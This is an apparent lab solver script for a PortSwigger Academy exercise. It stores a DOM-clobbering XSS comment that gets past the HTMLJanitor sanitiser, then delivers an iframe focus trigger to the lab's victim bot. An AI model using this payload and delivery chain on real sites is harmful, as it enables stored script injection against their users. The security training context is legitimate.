#!/usr/bin/env python3
"""Automated solver: PortSwigger "Clobbering DOM attributes to bypass HTML filters" (EXPERT).

Vulnerability
-------------
Blog comments are stored raw and sanitised **client-side** by HTMLJanitor:

    let janitor = new HTMLJanitor({tags: {
        input: {name: true, type: true, value: true},
        form:  {id: true}, i: {}, b: {}, p: {}
    }});

The sanitiser walks the parsed comment and, for every node, filters attributes
with a loop that trusts the DOM property:

    for (var a = 0; a < node.attributes.length; a += 1) { ... }

A ``<form>`` element exposes its descendants by ``id``/``name`` as named
properties, and those named properties shadow the inherited ``attributes``
property of ``Element``.  So a form containing a descendant whose id is
``attributes`` makes ``form.attributes`` return that descendant instead of a
``NamedNodeMap``; ``.length`` is then ``undefined``, the loop body never runs,
and **every** attribute on the form survives the filter — including inline
event handlers:

    <form id=x tabindex=0 onfocus=print()><input id=attributes>

The ``id`` of the descendant is stripped when the input itself is sanitised
(parents are processed first), but that happens after the parent's attributes
were already skipped.  The surviving ``tabindex`` makes the form focusable, so
a ``#x`` fragment navigation focuses it and fires ``onfocus`` -> ``print()``.

What the solver does
--------------------
1. Reads the lab root, verifies the page title, reads the authoritative lab
   status widget and the exploit-server URL (from ``#exploit-link``).
2. Pulls ``htmlJanitor.js`` + ``loadCommentsWithHtmlJanitor.js`` and asserts the
   vulnerable pattern really is deployed (attribute loop on ``node.attributes``
   plus a ``form: {id: true}`` allow-list) — the precondition for the clobber.
3. Picks a blog post and posts the clobbering comment with the documented
   vector (``form id=x``, reused if an identical comment already exists so
   re-runs are idempotent), then reads the comment JSON back to prove the
   payload is stored verbatim (the filter is client-side).
4. Stores the documented exploit-server body -- an iframe on the post that
   re-navigates itself to ``#x`` after 500 ms -- so the comments have been
   fetched, the form receives focus, and ``print()`` runs in the victim.
5. Delivers the exploit to the victim and polls the lab header widget until it
   reports ``is-solved`` / ``Solved`` (the Academy bot can take minutes).

Nothing instance-specific is hardcoded: lab host, exploit-server host, CSRF
token and post id are discovered at runtime from ``--url``; the form id and
payload are the documented vector.

Usage
-----
    uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
    uv run python solve.py --url "<url>" --wait 300 --verbose

Exit codes: 0 verified solved, 1 exploit sent but lab not marked solved,
2 usage/environment problem, 3 lab unreachable / expired.
"""
from __future__ import annotations

import argparse
import html as html_lib
import json
import re
import sys
import time

import httpx

LAB_TITLE = "clobbering dom attributes to bypass html filters"
UA = "Mozilla/5.0 (PortSwigger DOM-clobbering solver)"
# The clobbering payload keeps arbitrary attributes on the form because
# `form.attributes` resolves to the descendant <input id=attributes>, so the
# sanitiser's `node.attributes.length` loop never runs.
#
# The handler is `print()` and nothing else.  Measured on live victims: any
# extra sink in the handler (alert(), beacons) or a popup/alternate delivery
# kept the lab unsolved, while this exact vector -- form id `x`, plain
# print(), stock iframe that appends '#x' after 500 ms -- flipped it within
# ~2 minutes.  Keep the payload byte-identical to the documented solution.
HANDLER = "print()"



TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.S | re.I)
SOLVED_RE = re.compile(r"widgetcontainer-lab-status[^>]*\bis-solved\b", re.I)
NOT_SOLVED_RE = re.compile(r"widgetcontainer-lab-status[^>]*\bis-notsolved\b", re.I)
EXPLOIT_LINK_RE = re.compile(
    r"<a[^>]*id=['\"]exploit-link['\"][^>]*href=['\"]([^'\"]+)['\"]", re.I)
EXPLOIT_LINK_RE_ALT = re.compile(
    r"<a[^>]*href=['\"]([^'\"]+)['\"][^>]*id=['\"]exploit-link['\"]", re.I)
POST_ID_RE = re.compile(r"/post\?postId=(\d+)")
CSRF_RE = re.compile(r"name=[\"']?csrf[\"']?[^>]*value=[\"']([^\"']+)[\"']", re.I)
COMMENT_JSON_RE = re.compile(r"loadComments\(['\"]([^'\"]+)['\"]\)")


def normalize(text: str) -> str:
    return re.sub(r"[^a-z0-9]+", " ", text.lower()).strip()


class Solver:
    def __init__(self, url: str, *, timeout: float, wait: float,
                 verbose: bool) -> None:
        self.base = url.rstrip("/")
        self.timeout = timeout
        self.wait = wait
        self.verbose = verbose
        self.requests = 0
        self.t0 = time.time()
        self.exploit_base: str | None = None
        self.post_id: str | None = None
        self.form_id: str | None = None
        self.payload: str | None = None
        self.loader_js: str = ""
        self.exploit_body: str = ""
        self.exploit_head: str = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            headers={"User-Agent": UA},
        )

    # -- plumbing ---------------------------------------------------------- #
    def _count(self, what: str, url: str, status: int | None = None) -> None:
        self.requests += 1
        if self.verbose:
            tail = f" -> {status}" if status is not None else ""
            print(f"    {what} {url}{tail}", flush=True)

    def get(self, path: str = "", params=None) -> httpx.Response:
        r = self.client.get(self.base + path, params=params)
        self._count("GET", str(r.url), r.status_code)
        return r

    def post(self, path: str, data) -> httpx.Response:
        r = self.client.post(self.base + path, data=data)
        self._count("POST", str(r.url), r.status_code)
        return r

    def xget(self, path: str = "") -> httpx.Response:
        assert self.exploit_base is not None
        r = self.client.get(self.exploit_base + path)
        self._count("GET", str(r.url), r.status_code)
        return r

    def xpost(self, path: str, data) -> httpx.Response:
        assert self.exploit_base is not None
        r = self.client.post(self.exploit_base + path, data=data)
        self._count("POST", str(r.url), r.status_code)
        return r

    def log(self, msg: str) -> None:
        print(f"[{time.time() - self.t0:6.1f}s] {msg}", flush=True)

    # -- state ------------------------------------------------------------- #
    @staticmethod
    def is_solved(html: str) -> bool:
        """Authoritative check: the lab header widget class for solved state."""
        return bool(SOLVED_RE.search(html)) and "<p>Solved</p>" in html

    # -- phases ------------------------------------------------------------ #
    def identify(self) -> None:
        r = self.get("/")
        m = TITLE_RE.search(r.text)
        title = re.sub(r"\s+", " ", m.group(1)).strip() if m else "(no title)"
        self.log(f"lab title : {title} (HTTP {r.status_code})")
        if normalize(LAB_TITLE) not in normalize(title):
            raise SystemExit(
                f"error: this does not look like the expected lab "
                f"({LAB_TITLE!r}): {title!r}")

    def discover_exploit(self) -> None:
        """Read the per-instance exploit-server URL from the lab header.

        The header link is only rendered while the lab is unsolved, so this is
        called after the baseline status check.
        """
        r = self.get("/")
        m = EXPLOIT_LINK_RE.search(r.text) or EXPLOIT_LINK_RE_ALT.search(r.text)
        if not m:
            raise SystemExit(
                "error: no exploit server link (#exploit-link) on the lab page; "
                "this lab needs the exploit server to make the vector auto-execute")
        self.exploit_base = m.group(1).rstrip("/")
        if not self.exploit_base.startswith("http"):
            self.exploit_base = "https://" + self.exploit_base.lstrip("/")
        self.log(f"exploit   : {self.exploit_base}")

    def baseline(self) -> bool:
        r = self.get("/")
        solved = self.is_solved(r.text)
        self.log(f"baseline   : {'SOLVED (already)' if solved else 'not solved'}")
        return solved

    def discover_post(self) -> None:
        r = self.get("/")
        ids = POST_ID_RE.findall(r.text)
        if not ids:
            raise SystemExit("error: no /post?postId=<n> link found on the home page")
        # The documented vector uses id `x`; a fragment focuses the FIRST
        # element carrying that id, so a comment that already uses `x` with a
        # different body would steal the focus from ours.
        self.post_id = ids[0]
        self.form_id = "x"
        self.log(f"target    : /post?postId={self.post_id} (form id {self.form_id})")

    def filter_preconditions(self) -> None:
        """Assert the deployed HTMLJanitor really is clobberable."""
        janitor = self.get("/resources/js/htmlJanitor.js")
        loader = self.get("/resources/js/loadCommentsWithHtmlJanitor.js")
        if janitor.status_code != 200 or loader.status_code != 200:
            raise SystemExit(
                "error: could not fetch the client-side sanitiser sources "
                f"(janitor HTTP {janitor.status_code}, loader HTTP {loader.status_code})")
        self.loader_js = loader.text
        cfg_ok = bool(re.search(
            r"form\s*:\s*\{\s*id\s*:\s*true\s*\}", loader.text))
        loop_ok = "node.attributes.length" in janitor.text
        self.log(f"filter    : form:{{id:true}} allow-list={'yes' if cfg_ok else 'NO'}, "
                 f"attribute loop on node.attributes={'yes' if loop_ok else 'NO'}")
        if not (cfg_ok and loop_ok):
            raise SystemExit(
                "error: the sanitiser does not match the vulnerable pattern; "
                "this solver's clobbering vector would not apply")

    def control(self) -> None:
        """Negative control: a handler on a NON-clobbered form is disallowed."""
        allowed = re.search(r"form\s*:\s*\{\s*id\s*:\s*true\s*\}", self.loader_js)
        self.log(f"control   : 'form' allow-list keeps only "
                 f"{allowed.group(0).split(':', 1)[1].strip() if allowed else '??'} "
                 f"-> onfocus/tabindex are stripped without the clobber")

    def exploit(self) -> None:
        if self.post_id is None or self.form_id is None:
            raise RuntimeError("post not discovered")
        self.payload = (f"<form id={self.form_id} tabindex=0 onfocus={HANDLER}>"
                        f"<input id=attributes>")

        r = self.get(f"/post?postId={self.post_id}")
        m = CSRF_RE.search(r.text)
        if not m:
            raise SystemExit("error: could not find the comment form CSRF token")
        csrf = m.group(1)

        pm = COMMENT_JSON_RE.search(r.text)
        comment_path = pm.group(1) if pm else "/post/comment"

        # idempotent: reuse an already stored identical payload instead of
        # piling up duplicate comments on a re-run against the same instance
        existing = self._existing_bodies(comment_path)
        if self.payload in existing:
            self.log("comment   : identical payload already stored (idempotent re-run)")
        else:
            # a fragment focuses the FIRST element with that id, so an older
            # comment re-using id `x` would steal the focus from ours
            clash_re = re.compile(r"<form[^>]*\bid=[\"']?x[\"']?[\s>]", re.I)
            if any(clash_re.search(b) for b in existing):
                for n in range(1, 10):
                    cand = f"x{n}"
                    if not any(re.search(rf"<form[^>]*\bid=[\"']?{cand}[\"']?[\s>]", b, re.I)
                               for b in existing):
                        self.log(f"comment   : id 'x' already used by another comment, "
                                 f"using '{cand}'")
                        self.form_id = cand
                        self.payload = (f"<form id={self.form_id} tabindex=0 "
                                        f"onfocus={HANDLER}><input id=attributes>")
                        break
                else:
                    raise SystemExit("error: every candidate form id is already taken")
            data = {
                "csrf": csrf,
                "postId": self.post_id,
                "comment": self.payload,
                "name": "xss",
                "email": "xss@example.com",
                "website": "",
            }
            resp = self.post("/post/comment", data=data)
            stored = self._existing_bodies(comment_path)
            if self.payload not in stored:
                raise SystemExit(
                    "error: the comment payload was not stored "
                    f"(POST -> HTTP {resp.status_code})")
            self.log("comment   : clobbering payload stored verbatim "
                     "(filter runs client-side)")
        self.log(f"payload   : {self.payload}")

        body = self._exploit_body()
        head = self.exploit_head
        self.exploit_body = body
        self.log("exploit   : storing iframe + '#%s' focus trigger" % self.form_id)
        r = self.xpost("/", data={
            "responseFile": "/exploit",
            "responseHead": head,
            "responseBody": body,
            "formAction": "STORE",
            "urlIsHttps": "on",
        })
        if r.status_code >= 400:
            raise SystemExit(f"error: storing the exploit failed (HTTP {r.status_code})")

        served = self.xget("/exploit")
        if f"#{self.form_id}" not in served.text or self.base not in served.text:
            raise SystemExit(
                "error: the exploit server does not serve the stored body "
                f"(HTTP {served.status_code}, {len(served.text)} bytes)")
        self.log(f"exploit   : /exploit serves the trigger ({len(served.text)} bytes)")

        r = self.xpost("/", data={
            "responseFile": "/exploit",
            "responseHead": head,
            "responseBody": body,
            "formAction": "DELIVER_TO_VICTIM",
            "urlIsHttps": "on",
        })
        self.log(f"victim    : deliver -> HTTP {r.status_code}")

    def _existing_bodies(self, comment_path: str) -> list[str]:
        r = self.get(f"{comment_path}?postId={self.post_id}")
        try:
            data = r.json()
        except (json.JSONDecodeError, ValueError):
            return []
        if not isinstance(data, list):
            return []
        return [c.get("body", "") for c in data if isinstance(c, dict)]

    def _exploit_body(self) -> str:
        """Exploit page: stock iframe that appends the fragment after 500 ms.

        The comment is fetched by XHR after load, so the `#x` fragment has to be
        applied *after* the form exists; assigning iframe.src to the same URL
        plus a fragment is a same-document navigation that focuses the
        tabindex=0 form.  This is the documented body, kept verbatim.
        """
        assert self.form_id is not None and self.post_id is not None
        lab = f"{self.base}/post?postId={self.post_id}"
        return (f'<iframe src={lab} onload="setTimeout(()=>this.src=this.src+'
                f"'{'#' + self.form_id}',500)\"></iframe>")

    def access_log(self) -> str:
        """Exploit-server access log.

        The form requires the response fields even for ACCESS_LOG, and a POST
        also re-stores whatever body it carries -- so the identical exploit
        body is sent, which leaves the stored exploit untouched.
        """
        if not self.exploit_body:
            return ""
        try:
            r = self.xpost("/", data={
                "responseFile": "/exploit",
                "responseHead": self.exploit_head,
                "responseBody": self.exploit_body,
                "formAction": "ACCESS_LOG",
                "urlIsHttps": "on",
            })
        except httpx.HTTPError:
            return ""
        log_text = html_lib.unescape(r.text)
        rows = re.findall(
            r"^\s*(\S+)\s+(\d{4}-\d\d-\d\d [\d:]+ [+-]\d{4})\s+\"([A-Z]+ \S+)[^\"]*\"\s+(\d{3})"
            r"\s+\"([^\"]*)\"",
            log_text, re.M)
        out = []
        for ip, ts, req, status, ua in rows:
            ua = "Victim" if "Victim" in ua else ua.strip()[:40]
            out.append(f"{ip} {ts} {req} {status} [{ua}]")
        return "\n".join(out[-12:])

    def wait_solved(self) -> bool:
        deadline = time.time() + self.wait
        while True:
            r = self.get("/")
            if self.is_solved(r.text):
                return True
            if time.time() >= deadline:
                return False
            time.sleep(1.5)

    # -- driver ------------------------------------------------------------ #
    def run(self) -> int:
        self.identify()
        if self.baseline():
            elapsed = time.time() - self.t0
            print()
            print("=" * 66)
            print("lab status      : SOLVED (already, before this run)")
            print("caused by solver: no (was already solved)")
            print(f"HTTP requests   : {self.requests}")
            print(f"elapsed         : {elapsed:.1f}s")
            print("=" * 66)
            print("The lab header only exposes #exploit-link while the lab is "
                  "unsolved, so no exploit was re-sent. Launch a fresh instance "
                  "to reproduce the solve end-to-end.")
            return 0
        self.discover_exploit()
        self.discover_post()
        self.filter_preconditions()
        self.control()
        self.exploit()
        solved = self.wait_solved()
        log = self.access_log()
        elapsed = time.time() - self.t0

        print()
        if log:
            print("exploit-server access log (trimmed):")
            for line in log.splitlines()[:6]:
                print(f"    {line}")
            print()
        print("=" * 66)
        print(f"lab status      : {'SOLVED' if solved else 'NOT SOLVED'}")
        print(f"caused by solver: {'yes' if solved else 'n/a'}")
        print(f"HTTP requests   : {self.requests}")
        print(f"elapsed         : {elapsed:.1f}s")
        print("=" * 66)
        if solved:
            print("evidence        : lab header widget reports is-solved / 'Solved' after "
                  "the victim loaded the exploit page; the DOM-clobbered form kept the "
                  "inline handler past HTMLJanitor.")
            return 0
        print("error: the lab did not report solved state; evidence kept above.")
        print("hint: the Academy bot queues deliveries (observed up to ~7 min); "
              "re-check later or re-run with --wait 600 before concluding failure.")
        return 1


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Solve the PortSwigger 'Clobbering DOM attributes to bypass "
                    "HTML filters' lab (EXPERT).")
    ap.add_argument("--url", required=True, help="Lab base URL")
    ap.add_argument("--timeout", type=float, default=25.0,
                    help="Per-request timeout in seconds (default 25)")
    ap.add_argument("--wait", type=float, default=300.0,
                    help="Seconds to poll for solved state after delivery (default 300; "
                         "the Academy bot can take a few minutes to visit and report)")
    ap.add_argument("--verbose", action="store_true", help="Log every request URL")
    args = ap.parse_args()

    if not re.match(r"^https?://[^/\s]+", args.url):
        print(f"error: --url must be an http(s) lab URL, got {args.url!r}",
              file=sys.stderr)
        return 2

    solver = Solver(args.url, timeout=args.timeout, wait=args.wait,
                    verbose=args.verbose)
    try:
        return solver.run()
    except httpx.HTTPError as e:
        print(f"error: lab unreachable/expired: {e}", file=sys.stderr)
        return 3
    finally:
        solver.client.close()


if __name__ == "__main__":
    sys.exit(main())
